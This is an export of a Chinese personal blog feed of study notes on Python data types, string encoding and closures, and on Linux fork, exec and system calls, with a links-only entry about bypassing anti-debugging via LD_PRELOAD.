<pre class="line-numbers language-python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> hash<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token number">2528502973977326415</span>
<span class="token operator">>></span><span class="token operator">></span> hash<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
Traceback <span class="token punctuation">(</span>most recent call last<span class="token punctuation">)</span><span class="token punctuation">:</span>
  File <span class="token string">"&lt;stdin>"</span><span class="token punctuation">,</span> line <span class="token number">1</span><span class="token punctuation">,</span> <span class="token keyword">in</span> <span class="token operator">&lt;</span>module<span class="token operator">></span>
TypeError<span class="token punctuation">:</span> unhashable type<span class="token punctuation">:</span> <span class="token string">'list'</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>创建dict</p>
<pre class="line-numbers language-python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> a <span class="token operator">=</span> dict<span class="token punctuation">(</span>one<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> two<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span> three<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span>
<span class="token operator">>></span><span class="token operator">></span> b <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'one'</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'two'</span><span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">'three'</span><span class="token punctuation">:</span> <span class="token number">3</span><span class="token punctuation">}</span>
<span class="token operator">>></span><span class="token operator">></span> c <span class="token operator">=</span> dict<span class="token punctuation">(</span>zip<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'one'</span><span class="token punctuation">,</span> <span class="token string">'two'</span><span class="token punctuation">,</span> <span class="token string">'three'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token operator">>></span><span class="token operator">></span> d <span class="token operator">=</span> dict<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token string">'two'</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">'one'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">'three'</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token operator">>></span><span class="token operator">></span> e <span class="token operator">=</span> dict<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">'three'</span><span class="token punctuation">:</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token string">'one'</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'two'</span><span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token operator">>></span><span class="token operator">></span> a <span class="token operator">==</span> b <span class="token operator">==</span> c <span class="token operator">==</span> d <span class="token operator">==</span> e
<span class="token boolean">True</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>dict也能够推倒(ﾉ*･ω･)ﾉ,ahhh)</p>
<h3 id="set"><a href="#set" class="headerlink" title="set"></a>set</h3><p>集合可以用于去重, 这操作…</p>
<pre class="line-numbers language-python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> list<span class="token punctuation">(</span>set<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">]</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>另外set的元素要是可散列的<br>set本身是不可散列的<br>但…frozenset可以散列<br>所以set里不能包含set, 但可以包含emmmm, frozenset</p>
<p>集合操作</p>
<ul>
<li><code>|</code> 并集</li>
<li><code>&amp;</code> 交集</li>
<li><code>-</code> 差集</li>
</ul>
<p>集合字面量<code>{1, 2, 3}</code>, 空集是<code>set()</code>, 而不能写成<code>{}</code>, 因为<code>{}</code>是空的dict</p>
<p>集合也能推倒…</p>
<h3 id="dict-amp-set-和-散列表"><a href="#dict-amp-set-和-散列表" class="headerlink" title="dict &amp; set 和 散列表"></a>dict &amp; set 和 散列表</h3><p>dict 和 set很快, 因为他们背后是散列表<br>set其实大概相当于是只有<code>key</code>的一个dict,(或者叫做不关注其<code>value</code>)</p>
<p>我还以为里面是树实现的…C++ 里map应该是树实现的吧</p>
<p>树来实现的话应该会比单纯的稀疏散列表要省下很多内存…</p>
<p>书中也提到了python字典在内存的开销上巨大</p>
<p>不过散列表以空间换时间, 是不是查询比树要快</p>
<p>散列表查询是直接线性的复杂度, 算是O(1)…?<br>如果这样子的话…那真的是快…</p>
<h2 id="总结一下-这个字面量"><a href="#总结一下-这个字面量" class="headerlink" title="总结一下,这个字面量"></a>总结一下,这个字面量</h2><pre class="line-numbers language-python"><code class="language-python"><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">]</span>   <span class="token comment" spellcheck="true"># list</span>

<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#tuple</span>
<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># tuple</span>
<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 就是1, 数字</span>

<span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">}</span> <span class="token comment" spellcheck="true"># dict</span>
<span class="token punctuation">{</span><span class="token punctuation">}</span>          <span class="token comment" spellcheck="true"># dict</span>

<span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">}</span>    <span class="token comment" spellcheck="true"># set</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="字符"><a href="#字符" class="headerlink" title="字符"></a>字符</h2><p>二进制序列类型</p>
<ul>
<li>bytes 不可变</li>
<li>bytearray 可变</li>
</ul>
<p>试验了下…这个东西对py2的支持不太好, py2还是str比较常用<br>字面量形式是<code>b&#39;somestr&#39;</code>, 下面都来自py3</p>
<pre class="line-numbers language-python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> bytes<span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span><span class="token string">'31 32 33 34'</span><span class="token punctuation">)</span>
b<span class="token string">'1234'</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>处理二进制数据常用struct和memoryview</p>
<p>在py2里, 看起来这个<code>bytes</code>是<code>str</code>接管了</p>
<pre class="line-numbers language-python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> type<span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span><span class="token string">'abc'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token operator">&lt;</span>type <span class="token string">'str'</span><span class="token operator">></span>
<span class="token operator">>></span><span class="token operator">></span> type<span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>b<span class="token string">'abc'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token operator">&lt;</span>type <span class="token string">'str'</span><span class="token operator">></span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>在py3里, 这里才出现了<code>bytes</code></p>
<pre class="line-numbers language-python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> type<span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span><span class="token string">'abc'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
Traceback <span class="token punctuation">(</span>most recent call last<span class="token punctuation">)</span><span class="token punctuation">:</span>
  File <span class="token string">"&lt;stdin>"</span><span class="token punctuation">,</span> line <span class="token number">1</span><span class="token punctuation">,</span> <span class="token keyword">in</span> <span class="token operator">&lt;</span>module<span class="token operator">></span>
  File <span class="token string">"/usr/lib/python3.5/base64.py"</span><span class="token punctuation">,</span> line <span class="token number">59</span><span class="token punctuation">,</span> <span class="token keyword">in</span> b64encode
    encoded <span class="token operator">=</span> binascii<span class="token punctuation">.</span>b2a_base64<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>
TypeError<span class="token punctuation">:</span> a bytes<span class="token operator">-</span>like object <span class="token keyword">is</span> required<span class="token punctuation">,</span> <span class="token operator">not</span> <span class="token string">'str'</span>

<span class="token operator">>></span><span class="token operator">></span> type<span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>b<span class="token string">'abc'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'bytes'</span><span class="token operator">></span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="编码-解码"><a href="#编码-解码" class="headerlink" title="编码 解码"></a>编码 解码</h3><p>编码encode: 字节序列 -&gt; 文本字符串<br>解码decode: 文本字符串 -&gt; 字节序列<br>emmmmmm…. 这个在py2有点迷<br>py3的话<br>encode只存在于<code>str</code>, 即为<code>bytes str.encode(args)</code><br>decode只存在于<code>bytes</code>, 即为<code>str bytes.decode(args)</code></p>
<pre class="line-numbers language-python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token string">'a'</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf8'</span><span class="token punctuation">)</span>
b<span class="token string">'a'</span>
<span class="token comment" spellcheck="true"># encode: str -> bytes</span>

<span class="token operator">>></span><span class="token operator">></span> b<span class="token string">'a'</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf8'</span><span class="token punctuation">)</span>
<span class="token string">'a'</span>
<span class="token comment" spellcheck="true"># decode: bytes -> str</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>而且.这个args只能是<code>text encode</code>, 不能是<code>hex</code>之类的….<br>另外, 一般的比如utf-8有很多别名可以用: <code>utf8</code>, <code>utf_8</code>, <code>utf-8</code>, <code>U8</code></p>
<p>现在没网..不过估计..应该是py2这一块比较混乱, 所以py3把encode, decode这一块功能单一化了<br>根据错误提示…应该是是放到<code>codecs.decode</code>和<code>codecs.encode</code>了</p>
<blockquote>
<p>py2 默认编码是ascii, py3默认编码是utf8</p>
</blockquote>
<p>先跳过这一块…这…感觉文本处理, 还是推荐使用py3的感觉</p>
<p>开始是用<code>help(&#39;str&#39;)</code>来找到<code>encode</code>和<code>decode</code>的帮助…然后才发现这样子更好</p>
<pre class="line-numbers language-python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">print</span> <span class="token string">''</span><span class="token punctuation">.</span>encode<span class="token punctuation">.</span>__doc__
S<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">[</span>encoding<span class="token punctuation">[</span><span class="token punctuation">,</span>errors<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> object

Encodes S using the codec registered <span class="token keyword">for</span> encoding<span class="token punctuation">.</span> encoding defaults
to the default encoding<span class="token punctuation">.</span> errors may be given to set a different error
handling scheme<span class="token punctuation">.</span> Default <span class="token keyword">is</span> <span class="token string">'strict'</span> meaning that encoding errors <span class="token keyword">raise</span>
a UnicodeEncodeError<span class="token punctuation">.</span> Other possible values are <span class="token string">'ignore'</span><span class="token punctuation">,</span> <span class="token string">'replace'</span> <span class="token operator">and</span>
<span class="token string">'xmlcharrefreplace'</span> <span class="token keyword">as</span> well <span class="token keyword">as</span> any other name registered <span class="token keyword">with</span>
codecs<span class="token punctuation">.</span>register_error that <span class="token keyword">is</span> able to handle UnicodeEncodeErrors<span class="token punctuation">.</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>我蠢了…</p>
<pre class="line-numbers language-python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> help<span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">.</span>encode<span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>这样子help得到的结果好像是就是<code>__doc__</code>过来的</p>
<h2 id="闭包"><a href="#闭包" class="headerlink" title="闭包"></a>闭包</h2><p>抄书上的一个例子</p>
<pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">make_averager</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    series <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
    <span class="token keyword">def</span> <span class="token function">averager</span><span class="token punctuation">(</span>new_value<span class="token punctuation">)</span><span class="token punctuation">:</span>
        series<span class="token punctuation">.</span>append<span class="token punctuation">(</span>new_value<span class="token punctuation">)</span>
        total <span class="token operator">=</span> sum<span class="token punctuation">(</span>series<span class="token punctuation">)</span>
        <span class="token keyword">return</span> total<span class="token operator">/</span>len<span class="token punctuation">(</span>series<span class="token punctuation">)</span>
    <span class="token keyword">return</span> averager
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
]]></content>
      
        
        <tags>
            
            <tag> 入门 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[流畅的python-读书笔记]]></title>
      <url>/2017/08/09/%E6%B5%81%E7%95%85%E7%9A%84python-%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/</url>
      <content type="html"></content>
      
        <categories>
            
            <category> 学习 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 半途而费 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[读书笔记-静态链接]]></title>
      <url>/2017/08/06/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0-%E9%9D%99%E6%80%81%E9%93%BE%E6%8E%A5/</url>
      <content type="html"></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[使用LD_PRELOAD来bypass掉反调试]]></title>
      <url>/2017/08/05/%E4%BD%BF%E7%94%A8LD-PRELOAD%E6%9D%A5bypass%E6%8E%89%E5%8F%8D%E8%B0%83%E8%AF%95/</url>
      <content type="html"><![CDATA[<p>读了几篇文章,感觉好像确实,emmmm,可以诶</p>
<p>查了查资料…原来这就算是<code>Linux hook</code>了…所以查找了些资料</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="http://blog.csdn.net/yyttiao/article/details/7391831" target="_blank" rel="external">http://blog.csdn.net/yyttiao/article/details/7391831</a> (一个系列的文章)<br><a href="http://www.cnblogs.com/LittleHann/p/3854977.html" target="_blank" rel="external">http://www.cnblogs.com/LittleHann/p/3854977.html</a> (一个总结)<br><a href="http://blog.csdn.net/u012301943/article/details/25830229" target="_blank" rel="external">http://blog.csdn.net/u012301943/article/details/25830229</a><br><a href="http://manoharvanga.com/hackme/" target="_blank" rel="external">http://manoharvanga.com/hackme/</a></p>
]]></content>
      
        <categories>
            
            <category> 学习 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[mark一下最近看到的文章]]></title>
      <url>/2017/08/05/mark%E4%B8%80%E4%B8%8B%E6%9C%80%E8%BF%91%E7%9C%8B%E5%88%B0%E7%9A%84%E6%96%87%E7%AB%A0/</url>
      <content type="html"><![CDATA[<ol>
<li><a href="http://manoharvanga.com/hackme/" target="_blank" rel="external">http://manoharvanga.com/hackme/</a><br>译文 <a href="http://blog.csdn.net/fisher_jiang/article/details/6783922" target="_blank" rel="external">http://blog.csdn.net/fisher_jiang/article/details/6783922</a><br>里面有作者如何bypass反调试的各种技巧以及..以及请点击看原文</li>
</ol>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[程序员的自我修养 读书笔记]]></title>
      <url>/2017/08/05/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB-%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/</url>
      <content type="html"><![CDATA[<h2 id="第一章"><a href="#第一章" class="headerlink" title="第一章"></a>第一章</h2><h3 id="进程和线程"><a href="#进程和线程" class="headerlink" title="进程和线程"></a>进程和线程</h3><p>一个标准的线程由 线程ID, 当前指令指针(PC), 寄存器集合, 堆栈组成<br>各个进程独享的资源有</p>
<ul>
<li>栈</li>
<li>寄存器</li>
</ul>
<p>各个线程间共享程序的内存空间和一些进程间级的资源,具体来说是</p>
<ul>
<li>代码段</li>
<li>数据段</li>
<li>堆</li>
</ul>
<h3 id="c程序员角度来看"><a href="#c程序员角度来看" class="headerlink" title="c程序员角度来看"></a>c程序员角度来看</h3><table>
<thead>
<tr>
<th>线程私有</th>
<th>线程间共享 </th>
</tr>
</thead>
<tbody>
<tr>
<td>局部变量</td>
<td>全局变量</td>
</tr>
<tr>
<td>函数参数</td>
<td>堆上的数据</td>
</tr>
<tr>
<td>TLS数据</td>
<td>函数里的静态变量</td>
</tr>
<tr>
<td></td>
<td>程序代码</td>
</tr>
<tr>
<td></td>
<td>打开的文件(进程级资源)</td>
</tr>
</tbody>
</table>
<p>这个说A线程打开的文件,B线程可以进行读写</p>
<h3 id="windows多线程"><a href="#windows多线程" class="headerlink" title="windows多线程"></a>windows多线程</h3><p>CreateProcess 创建进程<br>CreateThread  创建线程</p>
<h3 id="Linux多线程"><a href="#Linux多线程" class="headerlink" title="Linux多线程"></a>Linux多线程</h3><p>没有明确的进程和线程的概念<br>所有执行实体是叫做任务(Task), 每个任务相当于是一个单线程的进程, 不同任务可以<code>选择</code>共享内存空间,共享了内存空间的Task就相当于是构成了一个进程,这些Task相当于是线程</p>
<table>
<thead>
<tr>
<th>系统调用</th>
<th>作用</th>
</tr>
</thead>
<tbody>
<tr>
<td>fork</td>
<td>复制当前进程</td>
</tr>
<tr>
<td>exec</td>
<td>使用新的可执行映像覆盖当前可执行映像</td>
</tr>
<tr>
<td>clone</td>
<td>创建子进程并从指定位置开始执行</td>
</tr>
</tbody>
</table>
<p>fork产生一个完全一样的新进程</p>
<pre class="line-numbers language-c"><code class="language-c">pid_t pid<span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span>pid <span class="token operator">=</span> <span class="token function">fork</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
<span class="token punctuation">}</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>fork 和 exec 一起使用可以产生新的任务<br><code>fork</code>产生的新进程和原来的进程共享<code>写时复制</code>的内存空间,当对内存修改的时候才进行内存空间复制</p>
<h4 id="exec"><a href="#exec" class="headerlink" title="exec"></a>exec</h4><blockquote>
<p>Linux下不存在exec这个函数…所以直接exec会报错</p>
</blockquote>
<p>exec是一组函数,他们是</p>
<pre class="line-numbers language-c"><code class="language-c"> <span class="token keyword">int</span> <span class="token function">execl</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>path<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>arg<span class="token punctuation">,</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token keyword">int</span> <span class="token function">execlp</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>file<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>arg<span class="token punctuation">,</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token keyword">int</span> <span class="token function">execle</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>path<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>arg<span class="token punctuation">,</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span> <span class="token keyword">const</span> envp<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

 <span class="token keyword">int</span> <span class="token function">execv</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>path<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token keyword">const</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token keyword">int</span> <span class="token function">execvp</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>file<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token keyword">const</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token keyword">int</span> <span class="token function">execvpe</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>file<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token keyword">const</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token keyword">const</span> envp<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><code>l</code>: 可变长参数<br><code>p</code>: 会搜索环境变量找到<code>file</code><br><code>e</code>: 可自设环境变量</p>
<p>另外还有一个<code>系统调用</code>execve</p>
<pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">execve</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>filename<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token keyword">const</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token keyword">const</span> envp<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>上面的6个exec系列是包装了<code>execve</code></p>
<h4 id="exec-和-fork一起使用"><a href="#exec-和-fork一起使用" class="headerlink" title="exec 和 fork一起使用"></a>exec 和 fork一起使用</h4><pre class="line-numbers language-c"><code class="language-c"><span class="token comment" spellcheck="true">/* **********************************************
Auther: haibin
Created Time: 2017年08月05日 星期六 16时08分02秒
File Name   : thread.c
*********************************************** */</span>

<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h></span></span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    pid_t pid <span class="token operator">=</span> <span class="token function">fork</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">int</span> i<span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>pid <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fork Error\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>pid <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"I'm son\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">execve</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">,</span> <span class="token string">"sh"</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">for</span><span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">10</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"I'm son\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//不会执行</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"I'm father\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">wait</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">for</span><span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">10</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"I'm father\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//会执行</span>
        <span class="token punctuation">}</span> 
        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h4 id="exec-和-system"><a href="#exec-和-system" class="headerlink" title="exec 和 system"></a>exec 和 system</h4><p>system相当于是重新开了一个进程,对于原来进程逻辑没有影响<br>所以上面的例子里如果不用execve而是用了<code>system(&quot;bin/sh&quot;)</code>的话,下面的<code>i&#39;m son</code>也还是会输出的</p>
<pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>command<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>相当于执行了<code>/bin/sh -c command</code><br>system在执行时候相当于会调用<code>fork</code>, <code>execve</code>, <code>waitpid</code><br><code>system(&quot;command&quot;)</code>相当于是</p>
<pre class="line-numbers language-c"><code class="language-c">pid_t pid <span class="token operator">=</span> <span class="token function">fork</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
